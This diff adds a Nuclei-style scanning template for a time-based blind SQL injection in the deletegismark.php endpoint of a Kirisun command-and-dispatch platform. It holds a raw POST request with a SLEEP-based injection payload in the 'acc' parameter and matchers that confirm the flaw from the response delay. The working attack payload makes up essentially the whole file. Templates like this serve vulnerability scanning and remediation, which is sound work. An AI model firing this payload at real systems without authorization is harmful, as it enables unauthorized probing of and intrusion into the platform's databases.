@@ -1,0 +1,36 @@
+id: kirisun-deletegismark-sqli
+info:
+  name: 指挥调度管理平台deletegismark.php存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59065/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,kirisun
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /api/client/deletegismark.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 83
+
+        acc=21'%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP(5)))FIjE)--+-&id=22222
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
